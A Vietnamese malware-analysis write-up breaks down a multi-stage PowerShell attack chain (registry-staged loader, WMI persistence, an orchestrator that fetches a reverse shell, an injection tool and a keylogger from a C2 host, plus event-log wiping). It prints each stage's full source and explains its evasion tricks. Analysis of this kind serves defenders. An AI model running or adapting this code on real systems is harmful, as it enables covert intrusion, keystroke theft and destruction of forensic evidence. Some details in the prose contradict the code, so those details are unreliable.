                │ IEX DownloadString('.../stage1.ps1')
                ▼
[Stage 1.5] stage1.ps1
                ├── Nếu chưa admin → UAC Bypass (ms-settings + ComputerDefaults.exe)
                │       └── chạy lại stage1.ps1 với admin
                └── Nếu admin → IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tắt 3 PowerShell logging policies (x64 + x86)
                ├── Disable 4 event channels (PowerShell, TaskScheduler, Sysmon, WMI)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lần)
                ├── Xóa temp policy test files
                ├── Spawn PowerShell MỚI → tải stage3.ps1
                └── exit
                        │
                        ▼
[Stage 3]   stage3.ps1 (PAYLOAD THẬT — chưa thấy)
                ├── Chạy trong process "sạch" không log
                ├── Không bị Sysmon/4104 ghi lại
                └── (RAT / ransomware / infostealer / C2 beacon / persistence...)
```

# 5. stage3.txt

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```ps1
function Invoke-Stage3Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $C2 = "https://192.168.56.100:8443"

    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    $PayloadText = $wc.DownloadString("$C2/wmi_setup.ps1")

    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
    reg add "HKCU\Software\Classes\Discord" /v Payload /t REG_SZ /d $b64 /f | Out-Null

    $readBack = (Get-ItemProperty 'HKCU:\Software\Classes\Discord').Payload
    if ($readBack -ne $b64) { return }

    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack))
    iex $decoded

    Remove-Item "HKCU:\Software\Classes\Discord" -Recurse -Force -EA SilentlyContinue

    # =========================================================
    # FIX: Dung Start-Process thay & cmd.exe
    # => PS host KHONG theo doi exit code => KHONG sinh 4100
    # =========================================================
    $clearArg = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul & ' +
                'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 1>nul 2>nul & ' +
                'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 1>nul 2>nul & ' +
                'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 1>nul 2>nul'

    # Pass 1 — Start-Process
    Start-Sleep 5
    Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait

    # Pass 2 — Start-Process
    Start-Sleep 5
    Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait
}

Invoke-Stage3Main
```

</details>

<br>


Đây là **stage 3** — stage cuối trong chuỗi mà bạn đã cung cấp. Nó **không phải payload cuối** (payload thật nằm trong `wmi_setup.ps1`), mà là **loader/persistence setup** với kỹ thuật **registry staging** rất tinh vi và **anti-forensic** tinh chỉnh so với stage 2.

Điểm đáng chú ý nhất: **comment trong code** (`# FIX: Dung Start-Process thay & cmd.exe`) cho thấy attacker đã **debug và tinh chỉnh kỹ thuật** — đây là dấu hiệu của **operator đang vận hành live (red team / APT)**, không phải malware đóng gói sẵn.

---

## 5.1. Cấu trúc tổng thể

```text
Invoke-Stage3Main
├── Cấu hình TLS/proxy bypass
├── Tải wmi_setup.ps1 từ C2
├── Encode Base64 (UTF-16LE) → ghi vào registry HKCU\Software\Classes\APT29Stage1\Payload
├── Đọc lại → verify integrity
├── Decode → IEX (thực thi wmi_setup.ps1)
├── Sleep 5s → clear log lần 1 (qua Start-Process cmd.exe)
└── Sleep 15s → clear log lần 2
```


## 5.2. Phân tích từng phần

### 5.2.1. Downloader (giống các stage trước)

```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.WebRequest]::DefaultWebProxy = $null

$c2 = "https://192.168.56.100:8443"
$wc = New-Object Net.WebClient
$wc.Proxy = $null
$PayloadText = $wc.DownloadString("$c2/wmi_setup.ps1")
```

- Vẫn cùng bộ **bypass TLS + proxy**.
- Tải `wmi_setup.ps1` — đây là **payload thật** (tên gợi ý: thiết lập WMI persistence).

### 5.2.2. Registry Staging — kỹ thuật đáng chú ý nhất

```powershell
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadText))
reg add "HKCU\Software\Classes\Discord" /v Payload /t REG_SZ /d $b64 /f | Out-Null

$readBack = (Get-ItemProperty 'HKCU:\Software\Classes\Discord').Payload
if ($readBack -ne $b64) { return }

$decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack))
iex $decoded

Remove-Item "HKCU:\Software\Classes\Discord" -Recurse -Force -EA SilentlyContinue
```

Phân tích chi tiết:


| Bước | Hành động | Mục đích |
|---|---|---|
| 1 | `[Text.Encoding]::Unicode.GetBytes(...)` | Encode payload thành **UTF-16LE** (chuẩn Unicode của Windows) |
| 2 | `[Convert]::ToBase64String(...)` | Encode Base64 → chuỗi an toàn để lưu registry (không chứa ký tự đặc biệt) |
| 3 | `	reg add "HKCU\Software\Classes\Discord" /v Payload ...` | **Ghi payload vào registry** dưới dạng REG_SZ |
| 4 | `Get-ItemProperty ... .Payload` | Đọc lại để verify |
| 5 | `if ($readBack -ne $b64) { return }` | **Integrity check** — nếu ghi thất bại (bị AV chặn, registry bị redirect...) → thoát im lặng |
| 6 | `[Convert]::FromBase64String` + `Unicode.GetString` | Decode |
| 7 | `iex $decoded` | **Thực thi payload** |
| 8 | `	Remove-Item ... -Recurse -Force -EA SilentlyContinue` | **Xóa registry staging ngay sau khi chạy** — dọn dấu vết |

**Tại sao dùng registry làm staging?**

Đây là kỹ thuật **fileless staging** rất thông minh:

1. **Không ghi file xuống đĩa** → không có artifact cho AV file-scan.
2. **Registry ít bị monitor hơn filesystem** (dù Sysmon Event 13 có thể bắt — nhưng stage 2 đã tắt Sysmon).
3. `HKCU\Software\Classes\` là vị trí **user-writable** — không cần admin để ghi (dù stage này chạy admin).
4. `APT29Stage1` — tên key giả làm namespace COM/protocol handler → ngụy trang (trông giống registry hợp lệ).
5. **Base64 + UTF-16LE** → payload không đọc được bằng mắt thường, tránh bị string-scan.


#### Tại sao verify readBack?

```powershell
if ($readBack -ne $b64) { return }
```

- **Chống race condition / AV interference:** nếu AV/EDR phát hiện và xóa/sửa registry value ngay sau khi ghi → `$readBack` sẽ khác → script thoát im lặng thay vì crash (crash có thể sinh event log/crash dump).
- **Đảm bảo payload toàn vẹn** trước khi thực thi.
- **Tránh bị phát hiện qua error:** nếu không verify, `iex $null` hoặc `iex` chuỗi rỗng có thể gây lỗi → event 4104/4100.


#### Tại sao xóa registry sau khi dùng? (FIX MỚI)

```powershell
iex $decoded
Remove-Item "HKCU:\Software\Classes\Discord" -Recurse -Force -EA SilentlyContinue
```

- **Khác với bản cũ** (giữ lại `APT29Stage1`), bản này **xóa registry ngay sau `iex`**.
- **Mục đích:**
  - **Dọn dấu vết (anti-forensic)** — registry staging là IOC rõ ràng (Base64 blob), nếu để lại → blue team/AV dễ phát hiện.
  - **Tránh forensic decode** — nếu registry còn, analyst có thể decode → lấy lại `wmi_setup.ps1`. Xóa đi → chỉ còn trong RAM (nếu kịp dump).
  - **Giảm false positive** — scan registry sau này không thấy gì bất thường.
- **Thời điểm xóa chính xác:**
  - **Sau `iex $decoded`** — đảm bảo `wmi_setup.ps1` đã chạy xong và tạo subscription.
  - **Trước clear log** — không ảnh hưởng quá trình anti-forensic.
  - `-EA SilentlyContinue` — nếu xóa fail (registry bị khóa), không sinh lỗi.

> ⚠️ **Lưu ý cho blue team:** Registry `Discord` chỉ tồn tại trong **vài giây** (từ `reg add` đến `Remove-Item`). Nếu không bắt kịp qua Sysmon Event 13 real-time → không thấy. Đây là lý do WEF/SIEM real-time là bắt buộc.


### 5.2.3. Anti-forensic — tinh chỉnh so với stage 2

```powershell
$clearArg = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul & ' +
            'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 1>nul 2>nul & ' +
            'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 1>nul 2>nul & ' +
            'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 1>nul 2>nul'

Start-Sleep 5
Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait

Start-Sleep 5
Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait
```

**Comment trong code — dấu hiệu "live operator"**

```powershell
# FIX: Dung Start-Process thay & cmd.exe
# => PS host KHONG theo doi exit code => KHONG sinh 4100
```

Đây là **comment debug của attacker** — cho thấy:

- **Attacker đã gặp vấn đề với stage 2** (dùng `& cmd.exe` trực tiếp).
- **Hiểu rõ cơ chế event 4100** của PowerShell.
- **Sửa và comment lại** — thói quen của developer/operator đang vận hành, không phải malware builder tự động.

### Event 4100 là gì và tại sao phải tránh?

- **Event 4100** = `Error Message` trong `Microsoft-Windows-PowerShell/Operational`.
- Sinh ra khi PowerShell host gặp **lỗi không bắt được** (unhandled error) — ví dụ: lệnh con trả exit code khác 0.

- Nếu dùng `& cmd.exe /c ...` trực tiếp trong PowerShell → PS host theo dõi exit code → nếu `wevtutil` fail (do log đã bị disable) → sinh event 4100.
- Dùng `Start-Process cmd.exe ... -Wait` → PS host không theo dõi exit code của process con → **không sinh 4100**.

→ Đây là kỹ thuật **opsec rất cao cấp** — attacker hiểu rõ từng event ID và cách tránh nó.

### So sánh với stage 2

| Đặc điểm | Stage 2 | Stage 3 |
|---|---|---|
| Cách clear log | `Start-Process cmd.exe -ArgumentList "/c", $clearCmds` | `Start-Process cmd.exe -ArgumentList $clearArg` (truyền cả `/c` trong string) |
| Số log clear | 7 (gồm Application, System, Security) | 4 (chỉ PowerShell, TaskScheduler, Sysmon, WMI) |
| Thời gian chờ | 2s giữa 2 lần | **5s và 15s** (dài hơn nhiều) |
| Mục đích chờ | Xóa event vừa sinh | **Chờ payload WMI chạy xong + sinh event + xóa** |
| Comment | Không có | **Có comment "FIX"** |
| Registry cleanup | — | Có xóa **Discord** sau **iex** |

### Điểm khác biệt quan trọng:

- **Stage 3 không xóa `Security` log** — có thể vì:
  - Đã xóa ở stage 2 rồi (không cần xóa lại).
  - Hoặc `wevtutil cl Security` cần quyền cao hơn / có thể fail → tránh sinh event.
- **Sleep 5s + 5s thay vì 2s** — vì `wmi_setup.ps1` (payload thật) có thể chạy lâu, sinh nhiều event (WMI subscription creation, process creation...) → cần chờ đủ lâu rồi mới xóa.
- **Double clear vẫn giữ** — đảm bảo sạch.

## 5.3. Luồng thực thi

```TXT
stage2.ps1 (spawn process PowerShell MỚI, không log)
    │
    ▼
IEX DownloadString('.../stage3.ps1')
    │
    ▼
stage3.ps1
    │
    ├── Tải wmi_setup.ps1 từ C2
    │
    ├── Base64(UTF-16LE) → ghi HKCU\Software\Classes\Discord\Payload
    │
    ├── Verify integrity (nếu fail → return im lặng)
    │
    ├── Decode → IEX → CHẠY wmi_setup.ps1  ← PAYLOAD THẬT (WMI persistence)
    │
    ├── XÓA HKCU\Software\Classes\Discord  ← FIX MỚI: dọn dấu vết
    │
    ├── Sleep 5s → clear 4 log (PowerShell, TaskScheduler, Sysmon, WMI)
    │
    └── Sleep 5s → clear 4 log lần 2
```

## 5.4. Tóm tắt toàn bộ kill chain (6 stage)

```TXT
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell ẩn
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader thuần)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe) nếu chưa admin
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tắt 3 PowerShell logging policies (x64 + x86)
                ├── Disable 4 event channels (PowerShell, TaskScheduler, Sysmon, WMI)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lần)
                ├── Xóa temp policy test files
                └── Spawn PowerShell MỚI → tải stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)  ← BẢN MỚI
                ├── Tải wmi_setup.ps1
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XÓA HKCU\Software\Classes\Discord  ← FIX MỚI
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1  ← WMI PERSISTENCE + PAYLOAD CUỐI
                │       (chưa thấy — có thể chứa WMI subscription + RAT/backdoor)
                │
                └── Clear 4 log (5s + 5s) để xóa dấu vết
```

# 6. wmi_setup.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```ps1
$S2 = "https://192.168.56.100:8443/orchestrator.ps1"

@('__FilterToConsumerBinding','CommandLineEventConsumer','__EventFilter') | ForEach-Object {
    Get-CimInstance -Namespace root/subscription -ClassName $_ -EA SilentlyContinue |
        Where-Object { $_.Name -eq 'NotepadTrigger' } | Remove-CimInstance -EA SilentlyContinue
}

$F = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{
    name = 'NotepadTrigger'; EventNameSpace = 'root\CimV2'; QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
}

$inner = "`$ErrorActionPreference='SilentlyContinue';try { [Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$S2') } catch { } ; exit 0"

$innerB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
$consumerCmd = "powershell.exe -NoP -W H -Exec Bypass -Enc $innerB64"

$C = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{
    name = 'NotepadTrigger'; CommandLineTemplate = $consumerCmd
}

New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = [Ref]$F; Consumer = [Ref]$C
} | Out-Null
```

</details>

<br>

Phân tích `wmi_setup.ps1` — WMI Event Subscription Persistence:

Đây là **payload thật của chuỗi** — không phải downloader, mà là **persistence mechanism dùng WMI Event Subscription**. Đây là kỹ thuật **fileless persistence nguy hiểm nhất trong Windows**, vì:

- **Sống sót qua reboot** (WMI repository được lưu trong `OBJECTS.DATA`).
- **Không nằm trong Run key / Service / Scheduled Task** → nhiều tool scan bỏ sót.
- **Chạy với quyền SYSTEM** (nếu tạo bởi admin — như trường hợp này).
- **Trigger theo sự kiện** (event-driven) → không cần chạy định kỳ.


## 6.1. Cấu trúc tổng thể

```text
wmi_setup.ps1
├── $S2 = C2 URL orchestrator.ps1
├── Dọn dẹp subscription cũ (cùng tên 'NotepadTrigger')
├── Tạo __EventFilter → trigger khi notepad.exe được tạo
├── Build payload PowerShell (base64 encoded)
├── Tạo CommandLineEventConsumer → chạy payload khi trigger
└── Tạo __FilterToConsumerBinding → liên kết filter + consumer
```

**Kết quả:** mỗi khi user mở **Notepad**, WMI sẽ tự động chạy PowerShell tải `orchestrator.ps1` từ C2 — **với quyền SYSTEM**.

---

## 6.2. Phân tích từng phần

### 6.2.1. C2 URL

```powershell
$S2 = "https://192.168.56.100:8443/orchestrator.ps1"
```

- `orchestrator.ps1` — **stage tiếp theo** (có thể là payload cuối, hoặc orchestrator điều phối nhiều module).
- Vẫn cùng C2 `192.168.56.100:8443` — attacker **không đổi hạ tầng** (điểm yếu dễ block).


### 6.2.2. Dọn dẹp subscription cũ

```powershell
@('__FilterToConsumerBinding','CommandLineEventConsumer','__EventFilter') | ForEach-Object {
    Get-CimInstance -Namespace root/subscription -ClassName $_ -EA SilentlyContinue |
        Where-Object { $_.Name -eq 'NotepadTrigger' } | Remove-CimInstance -EA SilentlyContinue
}
```

- **Xóa subscription cũ cùng tên `NotepadTrigger`** ở cả 3 lớp:
  - `__FilterToConsumerBinding` — liên kết.
  - `CommandLineEventConsumer` — consumer.
  - `__EventFilter` — filter.
- **Mục đích:**
  - **Idempotent** — chạy lại nhiều lần không bị trùng lặp.
  - **Tránh lỗi khi tạo mới** (nếu đã tồn tại → `New-CimInstance` fail).
  - **Cập nhật payload** — nếu `orchestrator.ps1` đổi, chạy lại script sẽ update subscription.
- `-EA SilentlyContinue` — không báo lỗi nếu chưa tồn tại.

### 6.2.3. Tạo `__EventFilter` — trigger

```powershell
$F = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{
    name = 'NotepadTrigger'
    EventNameSpace = 'root\Cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
}
```

**Phân tích WQL query:**


### 6.2.4. Build payload cho consumer

```powershell
$inner = "`$ErrorActionPreference='SilentlyContinue';try { [Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$S2') } catch {} ; exit 0"

$innerB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
$consumerCmd = "powershell.exe -NoP -W H -Exec Bypass -Enc $innerB64"
```

**Phân tích `$inner` (sau khi decode):**

```powershell
$ErrorActionPreference = 'SilentlyContinue'
try {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null
    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    IEX $wc.DownloadString('https://192.168.56.100:8443/orchestrator.ps1')
} catch {}
exit 0
```

**Các kỹ thuật opsec trong payload:**

| Kỹ thuật | Mục đích |
|---|---|
| `$ErrorActionPreference = 'SilentlyContinue'` | Không hiện lỗi nếu C2 die/block |
| `try { ... } catch {}` | Nuốt mọi exception — không sinh event lỗi |
| `exit 0` | **Exit code = 0** — quan trọng: `CommandLineEventConsumer` có thể log exit code nếu khác 0 |
| `-Enc $innerB64` | Encoded command — không lộ nội dung trong command line (tránh string scan, tránh 4104 nếu policy bật) |
| `-NoP -W H -Exec Bypass` | Vẫn bộ cờ ẩn/bypass quen thuộc |


#### Tại sao encode Base64 (UTF-16LE)?

- `-Enc` của PowerShell yêu cầu **Base64 của UTF-16LE** (Unicode).
- Command line của process sẽ **không chứa** `DownloadString`, `IEX`, `orchestrator.ps1` → tránh bị AV/EDR string-scan.
- Tuy nhiên, **Event 4104 vẫn có thể decode** nếu bật ScriptBlockLogging — nhưng stage 2 đã tắt rồi.

### 6.2.5. Tạo `CommandLineEventConsumer` — hành động

```powershell
$C = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{
    name = 'NotepadTrigger'
    CommandLineTemplate = $consumerCmd
}
```

- `CommandLineEventConsumer` — **class WMI cho phép chạy lệnh khi trigger**.
- `CommandLineTemplate = $consumerCmd` — lệnh sẽ chạy khi filter khớp.
- **Quyền thực thi:** consumer chạy với quyền của process tạo ra nó — ở đây là `wmi_setup.ps1` chạy từ stage 3 (đã admin) → consumer **chạy với SYSTEM** (thực tế là `WmiPrvSE.exe` chạy dưới `NT AUTHORITY\SYSTEM`).
- **Tên `NotepadTrigger`** — giả làm trigger liên quan Notepad (ngụy trang).

### 6.2.6. Tạo `__FilterToConsumerBinding` — liên kết

```powershell
New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
    Filter = [Ref]$F
    Consumer = [Ref]$C
} | Out-Null
```

- **Liên kết `$F` (filter) với `$C` (consumer).**
- `[Ref]` — WMI yêu cầu reference đến object.
- `| Out-Null` — ẩn output (object binding) → tránh bị log/print.

## 6.3. Luồng hoạt động sau khi setup

```txt
1. wmi_setup.ps1 chạy (từ stage 3, quyền admin)
        │
        ▼
2. Tạo 3 object WMI trong root/subscription:
   - __EventFilter (NotepadTrigger): trigger khi notepad.exe chạy
   - CommandLineEventConsumer (NotepadTrigger): chạy powershell -Enc <base64>
   - __FilterToConsumerBinding: liên kết 2 cái trên
        │
        ▼
3. wmi_setup.ps1 kết thúc — PERSISTENCE ĐÃ ĐƯỢC CÀI
        │
        ▼
   [Reboot máy — vẫn còn]
        │
        ▼
4. User mở Notepad (bất kỳ lúc nào)
        │
        ▼
5. WMI (WmiPrvSE.exe, quyền SYSTEM) phát hiện process notepad.exe mới
        │
        ▼
6. WMI kích hoạt CommandLineEventConsumer
        │
        ▼
7. powershell.exe -NoP -W H -Exec Bypass -Enc <base64> chạy với SYSTEM
        │
        ▼
8. IEX DownloadString('.../orchestrator.ps1')  ← PAYLOAD CHÍNH
        │
        ▼
9. orchestrator.ps1 chạy — (C2 beacon, RAT, ransomware...)
```

## 6.4. Tại sao WMI persistence nguy hiểm?

| Đặc điểm | Hệ quả |
|---|---|
| Lưu trong **WMI repository** (`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`) | Không phải file thông thường → AV file-scan không thấy |
| **Sống sót qua reboot** | Không cần re-run |
| **Không nằm trong** Run key / Service / Task | Autoruns, tool scan bỏ sót |
| **Chạy dưới `WmiPrvSE.exe` (SYSTEM)** | Quyền cao nhất |
| **Event-driven** | Không cần chạy định kỳ → khó phát hiện qua schedule |
| **Self-healing** | Nếu payload bị kill → lần mở Notepad sau chạy lại |
| **Legitimate mechanism** | WMI là thành phần hợp lệ của Windows → khó block |

**Đây là lý do WMI persistence được APT ưa chuộng (APT29, Turla, Equation Group đều dùng).**

## 6.5. Tóm tắt toàn bộ kill chain (7 stage)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell ẩn
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tắt 3 PowerShell logging policies
                ├── Disable 4 event channels (gồm Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lần)
                └── Spawn PowerShell MỚI → tải stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING)
                ├── Tải wmi_setup.ps1
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── Xóa HKCU\Software\Classes\Discord\Payload
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1  ← WMI PERSISTENCE
                │       ├── Tạo __EventFilter (NotepadTrigger)
                │       ├── Tạo CommandLineEventConsumer (powershell -Enc ...)
                │       └── Tạo __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Mỗi lần user mở Notepad]
                │               │
                │               ▼
                │       powershell.exe (SYSTEM) -Enc <base64>
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1  ← PAYLOAD CUỐI (chưa thấy)
                │               (C2 beacon / RAT / ransomware...)
                │
                └── Clear 4 log (5s + 15s)
```

# 7. orchestrator.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>


```ps1
function Invoke-OrchestratorMain {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $C2 = "https://192.168.56.100:8443"
    $marker = "C:\Windows\Temp\.syscache"

    # [1] REVSHELL
    try {
        $revPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};" +
                      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
                      "[Net.WebRequest]::DefaultWebProxy=`$null;" +
                      "`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;" +
                      "IEX `$wc.DownloadString('$C2/revshell.ps1')"
        $revB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($revPayload))
        Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
            CommandLine = "powershell.exe -NoP -W H -Exec Bypass -Enc $revB64"
        } | Out-Null
    } catch {}

    # [2] Cho notepad moi nhat
    $np = $null
    for ($i = 0; $i -lt 30; $i++) {
        $np = Get-Process notepad -EA SilentlyContinue | Sort-Object StartTime -Descending | Select -First 1
        if ($np) { break }
        Start-Sleep -Milliseconds 500
    }
    if (-not $np) { return }

    # [3] Idempotent check
    if (Test-Path $marker) {
        $lastPid = (Get-Content $marker -Raw).Trim()
        if ($lastPid -eq $np.Id.ToString()) { return }
    }

    # [4] Load tool
    try {
        $wc = New-Object Net.WebClient
        $wc.Proxy = $null
        $tool = $wc.DownloadString("$C2/Invoke-PSInject.ps1")
        Invoke-Expression $tool
    } catch { return }

    # [5] Stub
    $stubPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/keylogger.ps1')"
    $StubB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stubPayload))
    if ($StubB64.Length -gt 1200) { return }

    # [6] Inject
    try {
        Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
        $np.Id | Out-File $marker -Force
    } catch { return }

    # [7] CLEAR NGAY
    Start-Sleep 5
    $clearArg = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul'
    Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait
    Start-Sleep 3
    Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait

    # [8] Task clear delayed 5min
    $taskName = "SysLogMaint"
    if (-not (Get-ScheduledTask -TaskName $taskName -EA SilentlyContinue)) {
        try {
            $clearArg2 = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul & ' +
                        'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 1>nul 2>nul & ' +
                        'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 1>nul 2>nul & ' +
                        'schtasks /Delete /TN "SysLogMaint" /F 2>nul'
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $clearArg2
            $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $trigger -Principal $principal -Force | Out-Null
        } catch {}
    }
}

Invoke-OrchestratorMain
```

</details>

<br>

Phân tích `orchestrator.ps1` — Payload cuối: RevShell + Process Injection + Keylogger + Scheduled Task Anti-Forensic

Đây là **payload cuối (stage 5)** — file nguy hiểm nhất trong toàn chuỗi. Nó thực hiện **4 hành vi tấn công song song + 2 lớp anti-forensic**:

| # | Hành vi | Mục đích |
|---|---|---|
| 1 | **Reverse Shell** | Mở kết nối về C2, cho attacker điều khiển máy |
| 2 | **Process Injection** vào `notepad.exe` | Ẩn keylogger trong process lành tính |
| 3 | **Keylogger** | Ghi lại toàn bộ phím gõ (credential, chat, password...) |
| 4 | **Scheduled Task persistence** | Duy trì dọn log định kỳ, tự xóa task |
| 5 | **Idempotent marker** | Tránh inject trùng lặp |
| 6 | **Double log clear + delayed clear** | Xóa dấu vết ngay và sau 1 phút |

**Điểm đáng chú ý:** `orchestrator.ps1` chạy mỗi lần user mở **Notepad** (từ WMI consumer ở stage 4) — với **quyền SYSTEM**. Đây là chuỗi hoàn chỉnh: **persistence → payload → exfil**.


## 7.1. Cấu trúc tổng thể

```text
Invoke-OrchestratorMain
├── [1] RevShell: DownloadString('revshell.ps1') → chạy qua Win32_Process.Create
├── [2] Chờ Notepad mới nhất (tối đa 15s)
├── [3] Idempotent check: nếu PID đã inject rồi → return
├── [4] Tải Invoke-PSInject.ps1 (tool inject)
├── [5] Build stub keylogger (Base64, giới hạn <1200 ký tự)
├── [6] Inject stub vào Notepad → ghi marker PID
├── [7] Clear PowerShell log ngay (2 lần, cách 5s + 3s)
└── [8] Tạo Scheduled Task "SysLogMaint" clear log sau 1 phút + tự xóa
```

---

## 7.2. Phân tích từng phần

### 7.2.1. Cấu hình chung

```powershell
[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.WebRequest]::DefaultWebProxy = $null

$C2 = "https://192.168.56.100:8443"
$marker = "C:\Windows\Temp\.syscache"
```

- Vẫn bộ **bypass TLS + proxy** quen thuộc.
- `$marker = "C:\Windows\Temp\.syscache"` — file marker để **idempotent check** (tránh inject trùng).
- **Tên `.syscache`** — ngụy trang thành file cache hệ thống (bắt đầu bằng dấu `.`, nằm trong `C:\Windows\Temp\` → trông giống file tạm hợp lệ).


### 7.2.2. [1] Reverse Shell — kênh điều khiển từ xa

```powershell
try {
    $revPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};" +
                  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
                  "[Net.WebRequest]::DefaultWebProxy=`$null;" +
